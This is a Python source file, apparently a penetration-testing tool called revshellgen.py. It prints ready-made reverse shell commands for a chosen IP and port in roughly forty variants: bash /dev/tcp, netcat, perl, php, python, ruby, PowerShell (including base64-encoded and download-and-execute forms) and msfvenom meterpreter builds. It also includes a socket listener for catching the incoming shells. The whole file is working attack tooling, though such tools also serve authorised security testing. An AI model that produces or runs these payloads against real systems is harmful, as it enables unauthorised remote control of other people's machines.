#!/usr/bin/env python3

import argparse
import socket
import sys
import time
from base64 import b64encode

def parse_options():

    parser = argparse.ArgumentParser(description='python revshellgen.py -i 127.0.0.1 -p 1234 -t bash')
    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to")
    parser.add_argument("-p", "--port", type=int, help="Port to connect back to")
    parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate", dest='shell_type')
    parser.add_argument("-li", "--listen", action="store_true", help='Open a socket and listen for a shell')
    parser.add_argument("-ls", "--list", action="store_true", help="List available shell types", dest='shell_list')
    parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells!", dest='all_shells')
    args = parser.parse_args()
    # Print help if there is absolutely nothing passed from CLI
    if args.all_shells == False and args.ipaddr == None and args.port == None and args.shell_list == False and args.shell_type == None:
        print(parser.print_help())
    return args

def main(args):

    if args.ipaddr or args.port != None:
        ipaddr = args.ipaddr
        port = args.port
    else:
        ipaddr = '127.0.0.1'
        port = 1234

    shells = {
        'asp':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f asp > revshell.asp' % (ipaddr, port),
        'awk':'awk \'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (ipaddr, port),
        'bash':'bash -i >& /dev/tcp/%s/%d 0>&1' % (ipaddr, port),
        'bash-2':'0<&196;exec 196<>/dev/tcp/%s/%d; bash <&196 >&196 2>&196' % (ipaddr, port),
        'bash-3':'exec 5<> /dev/tcp/%s/%d; cat <&5 | while read line; do $line 2>&5>&5; done' % (ipaddr, port),
        'java':'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();' % (ipaddr, port),
        'jsp':'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw > revshell.jsp' % (ipaddr, port),
        'lin-bin':'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f elf > revshell' % (ipaddr, port),
        'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()\'' % (ipaddr, port),
        'nc':'nc -e /bin/sh %s %d' % (ipaddr, port),
        'nc-c':'nc -c /bin/sh %s %d' % (ipaddr, port),
        'nc-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
        'nc-mknod':'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
        'nc-pipe':'/bin/sh | nc %s %d' % (ipaddr, port),
        'ncat':'ncat %s %d -e /bin/sh' % (ipaddr, port),
        'nodejs':'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(%d,"%s",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();' % (port, ipaddr),
        'osx-bin':'msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f macho > revshell.macho' % (ipaddr, port),
        'perl':'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (ipaddr, port),
        'perl-2':'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (ipaddr, port),
        'perl-windows':'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"%s:%d");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (ipaddr, port),
        'php':'php -r \'$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-2':'php -r \'$s=fsockopen("%s",%d);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-3':'php -r \'$s=fsockopen("%s",%d);`/bin/sh -i <&3 >&3 2>&3`;\'' % (ipaddr, port),
        'php-4':'php -r \'$s=fsockopen("%s",%d);system("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
        'php-5':'php -r \'$s=fsockopen("%s",%d);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'' % (ipaddr, port),
        'ps-tcp':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
        'ps-iex':'powershell IEX (New-Object Net.WebClient).DownloadString("http://%s:%d/revshell.ps1") \n\nMake a revshell.ps1 file and put it on your server!' % (ipaddr, port),
        'ps-b64':'powershell -e '+ b64encode(('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port)).encode('utf16')[2:]).decode(),
        'python':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (ipaddr, port),
        'python-2':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\'' % (ipaddr, port),
        'ruby':'ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)\'' % (ipaddr, port),
        'ruby-2':'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
        'ruby-windows':'ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' % (ipaddr, port),
        'socat':'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:%s:%d \n\n[+] Catch incoming shell with:\n\nsocat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port),
        'tclsh':'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
        'telnet':'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
        'telnet-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %d > /tmp/f' % (ipaddr, port),
        'war':'msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (ipaddr, port),
        'win-bin':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
        'xterm':'xterm -display %s:1 \n\n[+] Connect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr)
    }

    if args.shell_type:
        print("\n[+] Reverse shell command:\n")
        print(shells[args.shell_type])

    if args.shell_list:
        print("\n[+] Available shell types:\n")
        print(shells.keys())

    if args.all_shells:
        print("\n[+]Reverse shell commands:\n")
        for t,shell in shells.items():
            print("{}\n".format(shell))

    if args.listen:

        null = 'echo ""'.encode()
        print("\n[+] Listening.\n")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', args.port))
        s.listen(5)
        conn, addr = s.accept()
        print("Connection from {}".format(addr))
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            sys.stdout.write(str(data))
            command = sys.stdin.readline()
            if 'exit' in command:
                conn.close()
                sys.exit()
            if 'clear' in command:
                conn.send(command.encode())
                conn.send(null)
            if 'export' in command:
                conn.send(command.encode())
                conn.send(null)
            conn.send(command.encode())
            time.sleep(0.1)

if __name__ == "__main__":

    args = parse_options()
    main(args)
